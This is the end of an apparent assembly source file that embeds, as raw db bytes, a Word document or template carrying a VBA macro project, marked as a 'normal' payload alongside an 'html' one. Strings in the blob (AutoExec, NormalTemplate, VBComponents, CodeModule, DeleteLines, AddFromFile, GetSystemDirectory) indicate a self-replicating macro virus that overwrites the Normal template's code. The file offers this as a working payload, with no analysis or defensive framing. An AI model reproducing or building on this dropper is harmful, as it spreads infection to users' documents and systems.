    db 001h, 000h, 018h, 000h, 054h, 000h, 068h, 000h, 069h, 000h, 073h, 000h
    db 044h, 000h, 06fh, 000h, 063h, 000h, 075h, 000h, 06dh, 000h, 065h, 000h
    db 06eh, 000h, 074h, 000h, 014h, 000h, 030h, 000h, 039h, 000h, 033h, 000h
    db 061h, 000h, 034h, 000h, 038h, 000h, 062h, 000h, 036h, 000h, 063h, 000h
    db 063h, 000h, 0ffh, 0ffh, 013h, 002h, 018h, 000h, 054h, 000h, 068h, 000h
    db 069h, 000h, 073h, 000h, 044h, 000h, 06fh, 000h, 063h, 000h, 075h, 000h
    db 06dh, 000h, 065h, 000h, 06eh, 000h, 074h, 000h, 0ffh, 0ffh, 09fh, 08ah
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 0e1h
    db 006h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 001h, 001h, 020h
    db 002h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 002h, 000h, 000h, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 02eh
    db 056h, 056h, 073h, 02ch, 082h, 07bh, 04eh, 096h, 023h, 0d8h, 0efh, 0b9h
    db 087h, 07ah, 082h, 0ffh, 0ffh, 0ffh, 0ffh, 001h, 000h, 000h, 000h, 0ffh
    db 0ffh, 0ffh, 0ffh, 060h, 000h, 000h, 000h, 080h, 000h, 000h, 000h, 000h
    db 000h, 024h, 001h, 026h, 000h, 0ffh, 000h, 068h, 029h, 000h, 000h, 000h
    db 000h, 00bh, 000h, 001h, 080h, 010h, 000h, 0ffh, 003h, 000h, 000h, 062h
    db 004h, 004h, 057h, 06fh, 072h, 064h, 0b5h, 06bh, 010h, 000h, 003h, 004h
    db 056h, 042h, 041h, 0f7h, 0e2h, 010h, 000h, 005h, 004h, 057h, 069h, 06eh
    db 031h, 036h, 0c1h, 07eh, 010h, 000h, 005h, 004h, 057h, 069h, 06eh, 033h
    db 032h, 007h, 07fh, 010h, 000h, 003h, 004h, 04dh, 061h, 063h, 0b3h, 0b2h
    db 010h, 000h, 004h, 004h, 056h, 042h, 041h, 036h, 0adh, 023h, 010h, 000h
    db 008h, 004h, 050h, 072h, 06fh, 06ah, 065h, 06bh, 074h, 031h, 0d2h, 041h
    db 010h, 000h, 006h, 004h, 073h, 074h, 064h, 06fh, 06ch, 065h, 093h, 060h
    db 010h, 000h, 00fh, 004h, 054h, 065h, 06dh, 070h, 06ch, 061h, 074h, 065h
    db 050h, 072h, 06fh, 06ah, 065h, 063h, 074h, 081h, 045h, 010h, 000h, 00ch
    db 004h, 054h, 068h, 069h, 073h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh
    db 074h, 03ch, 09eh, 010h, 000h, 009h, 080h, 000h, 000h, 0ffh, 003h, 003h
    db 000h, 05fh, 045h, 076h, 061h, 06ch, 075h, 061h, 074h, 065h, 018h, 0d9h
    db 010h, 000h, 006h, 004h, 04fh, 066h, 066h, 069h, 063h, 065h, 015h, 075h
    db 010h, 000h, 008h, 004h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h
    db 06ah, 0d3h, 010h, 000h, 012h, 004h, 047h, 065h, 074h, 053h, 079h, 073h
    db 074h, 065h, 06dh, 044h, 069h, 072h, 065h, 063h, 074h, 06fh, 072h, 079h
    db 06ah, 0d9h, 010h, 000h, 008h, 004h, 06ch, 070h, 042h, 075h, 066h, 066h
    db 065h, 072h, 03eh, 096h, 010h, 000h, 005h, 004h, 06eh, 053h, 069h, 07ah
    db 065h, 07dh, 093h, 010h, 000h, 008h, 004h, 06bh, 065h, 072h, 06eh, 065h
    db 06ch, 033h, 032h, 05fh, 0a5h, 010h, 000h, 008h, 004h, 041h, 075h, 074h
    db 06fh, 045h, 078h, 065h, 063h, 0ech, 09ch, 010h, 000h, 006h, 004h, 062h
    db 075h, 066h, 066h, 065h, 072h, 02dh, 0cbh, 010h, 000h, 009h, 004h, 074h
    db 065h, 06dh, 070h, 070h, 068h, 075h, 063h, 06bh, 03ah, 01dh, 010h, 000h
    db 00eh, 080h, 000h, 000h, 0ffh, 003h, 001h, 000h, 04eh, 06fh, 072h, 06dh
    db 061h, 06ch, 054h, 065h, 06dh, 070h, 06ch, 061h, 074h, 065h, 071h, 0ach
    db 010h, 000h, 009h, 080h, 000h, 000h, 0ffh, 003h, 001h, 000h, 056h, 042h
    db 050h, 072h, 06fh, 06ah, 065h, 063h, 074h, 04fh, 068h, 010h, 000h, 00ch
    db 000h, 056h, 042h, 043h, 06fh, 06dh, 070h, 06fh, 06eh, 065h, 06eh, 074h
    db 073h, 00ah, 027h, 010h, 000h, 003h, 000h, 043h, 06fh, 073h, 04fh, 07fh
    db 010h, 000h, 003h, 000h, 041h, 074h, 06eh, 051h, 075h, 010h, 000h, 00ah
    db 000h, 043h, 06fh, 064h, 065h, 04dh, 06fh, 064h, 075h, 06ch, 065h, 0e1h
    db 01ch, 010h, 000h, 005h, 000h, 053h, 070h, 061h, 063h, 065h, 00ch, 0eeh
    db 010h, 000h, 009h, 000h, 053h, 079h, 073h, 074h, 065h, 06dh, 044h, 069h
    db 072h, 02ch, 045h, 010h, 000h, 006h, 000h, 077h, 069h, 06eh, 064h, 069h
    db 072h, 054h, 0ddh, 010h, 000h, 006h, 080h, 000h, 000h, 0ffh, 003h, 001h
    db 000h, 053h, 079h, 073h, 074h, 065h, 06dh, 061h, 0a1h, 010h, 000h, 014h
    db 080h, 000h, 000h, 0ffh, 003h, 001h, 000h, 050h, 072h, 069h, 076h, 061h
    db 074h, 065h, 050h, 072h, 06fh, 066h, 069h, 06ch, 065h, 053h, 074h, 072h
    db 069h, 06eh, 067h, 05bh, 000h, 010h, 000h, 00dh, 004h, 06eh, 06fh, 05fh
    db 06dh, 061h, 063h, 072h, 06fh, 05fh, 063h, 06fh, 064h, 065h, 01eh, 068h
    db 010h, 000h, 00bh, 000h, 044h, 065h, 06ch, 065h, 074h, 065h, 04ch, 069h
    db 06eh, 065h, 073h, 00ch, 083h, 010h, 000h, 00ch, 000h, 043h, 06fh, 075h
    db 06eh, 074h, 04fh, 066h, 04ch, 069h, 06eh, 065h, 073h, 021h, 05ch, 010h
    db 000h, 004h, 000h, 049h, 074h, 065h, 06dh, 0d7h, 07ah, 010h, 000h, 00bh
    db 080h, 000h, 000h, 0ffh, 003h, 001h, 000h, 041h, 064h, 064h, 046h, 072h
    db 06fh, 06dh, 046h, 069h, 06ch, 065h, 0e7h, 075h, 010h, 000h, 004h, 080h
    db 000h, 000h, 0ffh, 003h, 001h, 000h, 053h, 061h, 076h, 065h, 092h, 0d0h
    db 010h, 000h, 002h, 0ffh, 0ffh, 001h, 001h, 048h, 000h, 000h, 000h, 010h
    db 002h, 0ffh, 0ffh, 0ffh, 0ffh, 013h, 002h, 000h, 000h, 001h, 000h, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 016h, 002h, 003h, 000h, 0ffh, 0ffh, 000h
    db 002h, 001h, 000h, 0ffh, 0ffh, 002h, 002h, 000h, 000h, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 00eh, 002h, 002h, 000h, 0ffh, 0ffh, 001h
    db 000h, 00ch, 000h, 000h, 000h, 001h, 000h, 012h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 001h, 0c2h, 0b1h, 080h, 001h, 000h, 004h, 000h
    db 000h, 000h, 001h, 000h, 030h, 02ah, 002h, 002h, 090h, 009h, 000h, 070h
    db 014h, 006h, 048h, 003h, 000h, 082h, 002h, 000h, 064h, 0e4h, 004h, 004h
    db 000h, 00fh, 000h, 01ch, 000h, 054h, 065h, 06dh, 070h, 06ch, 061h, 074h
    db 065h, 000h, 050h, 072h, 06fh, 06ah, 065h, 063h, 074h, 005h, 051h, 000h
    db 048h, 000h, 000h, 040h, 002h, 00ah, 006h, 002h, 00ah, 03dh, 0adh, 002h
    db 00ah, 007h, 002h, 07ch, 001h, 014h, 008h, 006h, 012h, 009h, 002h, 012h
    db 080h, 0d2h, 0b6h, 048h, 03ah, 014h, 000h, 00ch, 002h, 04ah, 012h, 03ch
    db 002h, 00ah, 016h, 000h, 001h, 039h, 073h, 074h, 064h, 010h, 06fh, 06ch
    db 065h, 03eh, 002h, 019h, 073h, 000h, 074h, 000h, 000h, 064h, 000h, 06fh
    db 000h, 06ch, 000h, 065h, 050h, 000h, 00dh, 000h, 066h, 000h, 025h, 05ch
    db 000h, 003h, 02ah, 000h, 05ch, 047h, 07bh, 030h, 030h, 030h, 032h, 030h
    db 0b0h, 034h, 033h, 030h, 02dh, 000h, 008h, 004h, 004h, 043h, 000h, 00ah
    db 003h, 002h, 00eh, 001h, 012h, 030h, 030h, 034h, 036h, 07dh, 023h, 000h
    db 032h, 02eh, 030h, 023h, 030h, 023h, 043h, 03ah, 000h, 05ch, 057h, 049h
    db 04eh, 032h, 04bh, 05ch, 053h, 000h, 079h, 073h, 074h, 065h, 06dh, 033h
    db 032h, 05ch, 001h, 003h, 063h, 032h, 02eh, 074h, 06ch, 062h, 023h, 04fh
    db 000h, 04ch, 045h, 020h, 041h, 075h, 074h, 06fh, 06dh, 0e0h, 061h, 074h
    db 069h, 06fh, 06eh, 000h, 02fh, 000h, 001h, 083h, 044h, 0a0h, 04fh, 066h
    db 066h, 069h, 063h, 084h, 044h, 04fh, 080h, 03eh, 0a0h, 066h, 000h, 069h
    db 000h, 063h, 082h, 044h, 07fh, 080h, 011h, 006h, 075h, 080h, 001h, 081h
    db 044h, 032h, 044h, 046h, 038h, 044h, 000h, 030h, 034h, 043h, 02dh, 035h
    db 042h, 046h, 041h, 000h, 02dh, 031h, 030h, 031h, 042h, 02dh, 042h, 044h
    db 0a4h, 045h, 035h, 080h, 044h, 041h, 041h, 080h, 042h, 034h, 080h, 005h
    db 022h, 032h, 085h, 044h, 044h, 03ah, 05ch, 080h, 097h, 067h, 072h, 000h
    db 061h, 06dh, 05ch, 057h, 06fh, 072h, 064h, 032h, 004h, 06bh, 05ch, 083h
    db 031h, 05ch, 04dh, 053h, 04fh, 039h, 000h, 02eh, 044h, 04ch, 04ch, 023h
    db 04dh, 069h, 063h, 080h, 072h, 06fh, 073h, 06fh, 066h, 074h, 020h, 083h
    db 00ch, 080h, 020h, 039h, 02eh, 030h, 020h, 04fh, 062h, 001h, 0b1h, 000h
    db 020h, 04ch, 069h, 062h, 072h, 061h, 072h, 079h, 08bh, 080h, 03bh, 000h
    db 001h, 00fh, 082h, 0c6h, 001h, 000h, 013h, 082h, 003h, 008h, 03bh, 077h
    db 019h, 002h, 098h, 054h, 068h, 069h, 073h, 000h, 044h, 06fh, 063h, 075h
    db 06dh, 065h, 06eh, 074h, 088h, 047h, 000h, 018h, 080h, 013h, 054h, 000h
    db 068h, 000h, 05bh, 008h, 073h, 000h, 044h, 000h, 0a3h, 063h, 000h, 075h
    db 000h, 0aah, 06dh, 000h, 060h, 06eh, 000h, 0abh, 01ah, 08eh, 017h, 032h
    db 09ah, 017h, 0a2h, 01ch, 0c0h, 012h, 000h, 000h, 048h, 042h, 001h, 031h
    db 002h, 070h, 05ah, 0e1h, 040h, 06bh, 01eh, 042h, 002h, 001h, 005h, 02ch
    db 0c2h, 021h, 09fh, 054h, 08ah, 022h, 042h, 008h, 02bh, 042h, 001h, 010h
    db 042h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 054h, 068h, 069h, 073h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h
    db 000h, 054h, 000h, 068h, 000h, 069h, 000h, 073h, 000h, 044h, 000h, 06fh
    db 000h, 063h, 000h, 075h, 000h, 06dh, 000h, 065h, 000h, 06eh, 000h, 074h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 049h, 044h, 03dh, 022h, 07bh, 046h, 038h, 038h
    db 031h, 037h, 042h, 036h, 036h, 02dh, 038h, 038h, 043h, 037h, 02dh, 034h
    db 045h, 046h, 042h, 02dh, 042h, 037h, 030h, 041h, 02dh, 044h, 041h, 039h
    db 035h, 041h, 043h, 034h, 034h, 033h, 046h, 039h, 033h, 07dh, 022h, 00dh
    db 00ah, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h, 03dh, 054h, 068h
    db 069h, 073h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h, 02fh, 026h
    db 048h, 030h, 030h, 030h, 030h, 030h, 030h, 030h, 030h, 00dh, 00ah, 04eh
    db 061h, 06dh, 065h, 03dh, 022h, 054h, 065h, 06dh, 070h, 06ch, 061h, 074h
    db 065h, 050h, 072h, 06fh, 06ah, 065h, 063h, 074h, 022h, 00dh, 00ah, 048h
    db 065h, 06ch, 070h, 043h, 06fh, 06eh, 074h, 065h, 078h, 074h, 049h, 044h
    db 03dh, 022h, 030h, 022h, 00dh, 00ah, 056h, 065h, 072h, 073h, 069h, 06fh
    db 06eh, 043h, 06fh, 06dh, 070h, 061h, 074h, 069h, 062h, 06ch, 065h, 033h
    db 032h, 03dh, 022h, 033h, 039h, 033h, 032h, 032h, 032h, 030h, 030h, 030h
    db 022h, 00dh, 00ah, 043h, 04dh, 047h, 03dh, 022h, 041h, 038h, 041h, 041h
    db 042h, 039h, 042h, 046h, 042h, 044h, 042h, 046h, 042h, 044h, 042h, 046h
    db 042h, 044h, 042h, 046h, 042h, 044h, 022h, 00dh, 00ah, 044h, 050h, 042h
    db 03dh, 022h, 031h, 041h, 031h, 038h, 030h, 042h, 035h, 042h, 037h, 043h
    db 035h, 043h, 037h, 043h, 035h, 043h, 037h, 043h, 022h, 00dh, 00ah, 047h
    db 043h, 03dh, 022h, 038h, 043h, 038h, 045h, 039h, 044h, 045h, 044h, 037h
    db 044h, 035h, 045h, 037h, 045h, 035h, 045h, 037h, 045h, 041h, 031h, 022h
    db 00dh, 00ah, 00dh, 00ah, 05bh, 048h, 06fh, 073h, 074h, 020h, 045h, 078h
    db 074h, 065h, 06eh, 064h, 065h, 072h, 020h, 049h, 06eh, 066h, 06fh, 05dh
    db 00dh, 00ah, 026h, 048h, 030h, 030h, 030h, 030h, 030h, 030h, 030h, 031h
    db 03dh, 07bh, 033h, 038h, 033h, 032h, 044h, 036h, 034h, 030h, 02dh, 043h
    db 046h, 039h, 030h, 02dh, 031h, 031h, 043h, 046h, 02dh, 038h, 045h, 034h
    db 033h, 02dh, 030h, 030h, 041h, 030h, 043h, 039h, 031h, 031h, 030h, 030h
    db 035h, 041h, 07dh, 03bh, 056h, 042h, 045h, 03bh, 026h, 048h, 030h, 030h
    db 030h, 030h, 030h, 030h, 030h, 030h, 00dh, 00ah, 00dh, 00ah, 05bh, 057h
    db 06fh, 072h, 06bh, 073h, 070h, 061h, 063h, 065h, 05dh, 00dh, 00ah, 054h
    db 068h, 069h, 073h, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h, 03dh
    db 034h, 034h, 02ch, 020h, 034h, 034h, 02ch, 020h, 034h, 039h, 032h, 02ch
    db 020h, 033h, 038h, 032h, 02ch, 020h, 05ah, 00dh, 00ah, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 001h, 000h, 0feh, 0ffh, 003h, 00ah, 000h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 006h, 009h, 002h, 000h, 000h, 000h, 000h, 000h
    db 0c0h, 000h, 000h, 000h, 000h, 000h, 000h, 046h, 00eh, 000h, 000h, 000h
    db 057h, 06fh, 072h, 064h, 02dh, 064h, 06fh, 06bh, 075h, 06dh, 065h, 06eh
    db 074h, 000h, 00ah, 000h, 000h, 000h, 04dh, 053h, 057h, 06fh, 072h, 064h
    db 044h, 06fh, 063h, 000h, 010h, 000h, 000h, 000h, 057h, 06fh, 072h, 064h
    db 02eh, 044h, 06fh, 063h, 075h, 06dh, 065h, 06eh, 074h, 02eh, 038h, 000h
    db 0f4h, 039h, 0b2h, 071h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 001h, 000h, 043h, 000h, 06fh, 000h, 06dh, 000h
    db 070h, 000h, 04fh, 000h, 062h, 000h, 06ah, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 012h, 000h, 002h, 001h
    db 0ffh, 0ffh, 0ffh, 0ffh, 00dh, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 05dh, 000h, 000h, 000h, 060h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 04fh, 000h, 062h, 000h, 06ah, 000h, 065h, 000h, 063h, 000h, 074h, 000h
    db 050h, 000h, 06fh, 000h, 06fh, 000h, 06ch, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 016h, 000h, 001h, 000h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 020h, 043h, 067h, 0afh, 065h, 0b4h, 0bfh, 001h
    db 020h, 043h, 067h, 0afh, 065h, 0b4h, 0bfh, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h

   normal_end:

   normal_len      equ normal_end-normal_start

   html_len          equ html_end-html_start






